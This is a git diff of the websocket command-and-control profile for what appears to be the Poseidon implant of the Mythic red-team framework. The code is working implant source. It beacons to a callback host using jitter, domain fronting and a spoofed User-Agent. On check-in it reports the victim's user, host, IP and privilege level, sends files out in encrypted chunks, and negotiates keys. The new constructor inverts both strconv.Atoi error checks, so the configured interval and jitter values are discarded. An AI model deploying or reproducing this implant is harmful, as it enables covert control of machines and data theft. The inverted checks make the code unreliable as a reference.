@@ -1,8 +1,6 @@
-// +build websocket
-
 // This file is copied to pkg/profiles/ directory when Poseidon is built using the websocket profile at https://github.com/MythicC2Profiles/websocket
 
-package profiles
+package websocket
 
 import (
 	"bytes"
@@ -15,6 +13,7 @@ import (
 	"net/http"
 	"os"
 	"reflect"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -26,20 +25,44 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/profiles"
 )
 
 var mu sync.Mutex
 
-var Config = structs.Websocketconfig{
-	"encrypted_exchange_check",
-	"AESPSK",
-	"callback_host:callback_port/",
-	"USER_AGENT",
-	callback_interval,
-	"domain_front",
-	callback_jitter,
-	"ENDPOINT_REPLACE",
-}
+// UUID is a per-payload identifier assigned by Mythic during creation
+var UUID string
+
+// TODO Update variables here and in the C2 profile to follow Go naming conventions
+// Websocket C2 profile variables from https://github.com/MythicC2Profiles/websocket/blob/master/C2_Profiles/websocket/mythic/c2_functions/websocket.py
+// All variables must be a string so they can be set with ldflags
+
+// callbackHost is used to create the BaseURL value in the Websocket C2 profile
+var callbackHost string
+
+// callback_port is used to create the BaseURL value in the Websocket C2 profile
+var callback_port string
+
+// USER_AGENT is the HTTP User-Agent header value
+var USER_AGENT string
+
+// AESPSK is Base64 of a 32B AES Key
+var AESPSK string
+
+// callback_interval is the callback interval in seconds
+var callback_interval string
+
+// encrypted_exchange_check is set to True or False to determine if Poseidon should do a key exchange
+var encrypted_exchange_check string
+
+// domain_front the Host header value for domain fronting
+var domain_front string
+
+// ENDPOINT_REPLACE is the websockets endpoint
+var ENDPOINT_REPLACE string
+
+// callback_jitter is the callback jitter in percent
+var callback_jitter string
 
 type C2Websockets struct {
 	HostHeader     string
@@ -50,18 +73,53 @@ type C2Websockets struct {
 	ApfellID       string
 	UserAgent      string
 	UUID           string
-	Key         string
+	Key            string
 	RsaPrivateKey  *rsa.PrivateKey
 	Conn           *websocket.Conn
-	Endpoint 	 string
+	Endpoint       string
 }
 
-func newProfile() Profile {
-	return &C2Websockets{}
+// New creates a new HTTP C2 profile from the package's global variables and returns it
+func New() profiles.Profile {
+	profile := C2Websockets{
+		HostHeader: domain_front,
+		BaseURL:    fmt.Sprintf("%s:%s/", callbackHost, callback_port),
+		UserAgent:  USER_AGENT,
+		Key:        AESPSK,
+		Endpoint:   ENDPOINT_REPLACE,
+		UUID:       UUID,
+		ApfellID:   UUID,
+	}
+
+	// Convert sleep from string to integer
+	i, err := strconv.Atoi(callback_interval)
+	if err != nil {
+		profile.Interval = i
+	} else {
+		profile.Interval = 10
+	}
+
+	// Convert jitter from string to integer
+	j, err := strconv.Atoi(callback_jitter)
+	if err != nil {
+		profile.Jitter = j
+	} else {
+		profile.Jitter = 23
+	}
+
+	if encrypted_exchange_check == "T" {
+		profile.ExchangingKeys = true
+	}
+
+	if len(profile.UserAgent) <= 0 {
+		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
+	}
+
+	return &profile
 }
 
-func (c C2Websockets) getSleepTime() int{
-	return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter))/float64(100.0))));
+func (c C2Websockets) getSleepTime() int {
+	return c.Interval + int(math.Round((float64(c.Interval) * (profiles.SeededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
 }
 
 func (c C2Websockets) SleepInterval() int {
@@ -72,7 +130,7 @@ func (c *C2Websockets) SetSleepInterval(interval int) {
 	c.Interval = interval
 }
 
-func (c *C2Websockets) SetSleepJitter(jitter int){
+func (c *C2Websockets) SetSleepJitter(jitter int) {
 	c.Jitter = jitter
 }
 
@@ -90,43 +148,13 @@ func (c C2Websockets) ProfileType() string {
 }
 
 func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, operatingsystem string, arch string) interface{} {
-	// Set the C2 Profile values
-	c.BaseURL = Config.BaseURL
-	c.Interval = Config.Sleep
-	c.Jitter = Config.Jitter
-
-	if strings.Contains(Config.KEYX, "T") {
-		c.ExchangingKeys = true
-	} else {
-		c.ExchangingKeys = false
-	}
-
-	if len(Config.Key) > 0 {
-		c.Key = Config.Key
-	} else {
-		c.Key = ""
-	}
-
-	if len(Config.HostHeader) > 0 {
-		c.HostHeader = Config.HostHeader
-	}
-
-	if len(Config.UserAgent) > 0 {
-		c.UserAgent = Config.UserAgent
-	} else {
-		c.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
-	}
-
-	c.Endpoint = Config.Endpoint
-
 	// Establish a connection to the websockets server
-	url := fmt.Sprintf("%s%s", c.BaseURL, Config.Endpoint)
-	//log.Printf(url)
+	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
 	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
 
 	// Set the host header
-	if (len(c.HostHeader) > 0) {
+	if len(c.HostHeader) > 0 {
 		header.Set("Host", c.HostHeader)
 	}
 
@@ -140,7 +168,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 		if err != nil {
 			//log.Printf("Error connecting to server %s ", err.Error())
 			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
-			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 			continue
 		}
 		c.Conn = connection
@@ -150,17 +178,17 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 	//log.Println("Connected to server ")
 	var resp []byte
 
-	c.UUID = UUID
-	c.ApfellID = c.UUID
-	checkin := structs.CheckInMessage{}
-	checkin.Action = "checkin"
-	checkin.User = user
-	checkin.Host = host
-	checkin.IP = ip
-	checkin.Pid = pid
-	checkin.UUID = c.UUID
-	checkin.OS = operatingsystem
-	checkin.Architecture = arch
+	checkin := structs.CheckInMessage{
+		Action:       "checkin",
+		IP:           ip,
+		OS:           operatingsystem,
+		User:         user,
+		Host:         host,
+		Pid:          pid,
+		UUID:         c.UUID,
+		Architecture: arch,
+	}
+
 	if functions.IsElevated() {
 		checkin.IntegrityLevel = 3
 	} else {
@@ -169,7 +197,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 	checkinMsg, _ := json.Marshal(checkin)
 
 	if c.ExchangingKeys {
-		_ = c.NegotiateKey()
+		c.NegotiateKey()
 	}
 
 	resp = c.sendData("", checkinMsg)
@@ -227,7 +255,7 @@ func (c *C2Websockets) SendFile(task structs.Task, params string, ch chan []byte
 		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
 		errResponseEnc, _ := json.Marshal(errResponse)
 		mu.Lock()
-		TaskResponses = append(TaskResponses, errResponseEnc)
+		profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
 		mu.Unlock()
 		return
 	}
@@ -240,7 +268,7 @@ func (c *C2Websockets) SendFile(task structs.Task, params string, ch chan []byte
 		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
 		errResponseEnc, _ := json.Marshal(errResponse)
 		mu.Lock()
-		TaskResponses = append(TaskResponses, errResponseEnc)
+		profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
 		mu.Unlock()
 		return
 	}
@@ -255,7 +283,7 @@ func (c *C2Websockets) SendFile(task structs.Task, params string, ch chan []byte
 		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
 		errResponseEnc, _ := json.Marshal(errResponse)
 		mu.Lock()
-		TaskResponses = append(TaskResponses, errResponseEnc)
+		profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
 		mu.Unlock()
 		return
 	}
@@ -278,7 +306,7 @@ func (c *C2Websockets) GetFile(r structs.FileRequest, ch chan []byte) ([]byte, e
 
 	msg, _ := json.Marshal(fileUploadMsg)
 	mu.Lock()
-	UploadResponses = append(UploadResponses, msg)
+	profiles.UploadResponses = append(profiles.UploadResponses, msg)
 	mu.Unlock()
 	// Wait for response from apfell
 	rawData := <-ch
@@ -304,7 +332,7 @@ func (c *C2Websockets) GetFile(r structs.FileRequest, ch chan []byte) ([]byte, e
 
 			msg, _ := json.Marshal(fileUploadMsg)
 			mu.Lock()
-			UploadResponses = append(UploadResponses, msg)
+			profiles.UploadResponses = append(profiles.UploadResponses, msg)
 			mu.Unlock()
 			rawData := <-ch
 			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
@@ -342,14 +370,14 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 	chunkResponse.FullPath = task.Params
 	msg, _ := json.Marshal(chunkResponse)
 	mu.Lock()
-	TaskResponses = append(TaskResponses, msg)
+	profiles.TaskResponses = append(profiles.TaskResponses, msg)
 	mu.Unlock()
 	// Wait for a response from the channel
 	var fileDetails map[string]interface{}
 	// Wait for a response from the channel
 
 	for {
-		resp := <- ch
+		resp := <-ch
 		err := json.Unmarshal(resp, &fileDetails)
 		if err != nil {
 			errResponse := structs.Response{}
@@ -359,7 +387,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 			errResponseEnc, _ := json.Marshal(errResponse)
 
 			mu.Lock()
-			TaskResponses = append(TaskResponses, errResponseEnc)
+			profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
 			mu.Unlock()
 			return
 		}
@@ -375,7 +403,6 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 			}
 		}
 	}
-
 
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
@@ -397,14 +424,14 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 
 		encmsg, _ := json.Marshal(msg)
 		mu.Lock()
-		TaskResponses = append(TaskResponses, encmsg)
+		profiles.TaskResponses = append(profiles.TaskResponses, encmsg)
 		mu.Unlock()
 
 		// Wait for a response for our file chunk
 		var postResp map[string]interface{}
 		for {
 			decResp := <-ch
-			err := json.Unmarshal(decResp, &postResp)// Wait for a response for our file chunk
+			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk
 
 			if err != nil {
 				errResponse := structs.Response{}
@@ -413,7 +440,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
 				errResponseEnc, _ := json.Marshal(errResponse)
 				mu.Lock()
-				TaskResponses = append(TaskResponses, errResponseEnc)
+				profiles.TaskResponses = append(profiles.TaskResponses, errResponseEnc)
 				mu.Unlock()
 				return
 			}
@@ -434,7 +461,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 			// If the post was not successful, wait and try to send it one more time
 
 			mu.Lock()
-			TaskResponses = append(TaskResponses, encmsg)
+			profiles.TaskResponses = append(profiles.TaskResponses, encmsg)
 			mu.Unlock()
 		}
 
@@ -452,12 +479,12 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 	finalEnc, _ := json.Marshal(final)
 	//c.PostResponse(task, string(finalEnc))
 	mu.Lock()
-	TaskResponses = append(TaskResponses, finalEnc)
+	profiles.TaskResponses = append(profiles.TaskResponses, finalEnc)
 	mu.Unlock()
 }
 
 func (c *C2Websockets) NegotiateKey() string {
-	sessionID := GenerateSessionID()
+	sessionID := profiles.GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	//initMessage := structs.EKEInit{}
@@ -500,10 +527,11 @@ func (c *C2Websockets) NegotiateKey() string {
 	return sessionID
 
 }
-func (c *C2Websockets) reconnect(){
+
+func (c *C2Websockets) reconnect() {
 	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
-	if (len(c.HostHeader) > 0) {
+	if len(c.HostHeader) > 0 {
 		header.Set("Host", c.HostHeader)
 	}
 	d := websocket.Dialer{
@@ -517,13 +545,14 @@ func (c *C2Websockets) reconnect(){
 		if err != nil {
 			//log.Printf("Error connecting to server %s ", err.Error())
 			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
-			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 			continue
 		}
 		c.Conn = connection
 		break
 	}
 }
+
 func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 	m := structs.Message{}
 	if len(c.Key) != 0 {
@@ -532,7 +561,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 
 	sendData = append([]byte(c.ApfellID), sendData...)
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
-	for true{
+	for true {
 		m.Client = true
 		m.Data = string(sendData)
 		m.Tag = tag
@@ -561,7 +590,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 
 		if len(raw) < 36 {
 			//log.Println("length of data < 36")
-			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 			continue
 		}
 
@@ -571,7 +600,7 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 			//log.Printf("Decrypting data")
 			enc_raw = c.decryptMessage(enc_raw)
 			if len(enc_raw) == 0 {
-				time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 				continue
 			}
 		}
@@ -581,7 +610,6 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 
 	return make([]byte, 0)
 }
-
 
 func (c *C2Websockets) encryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
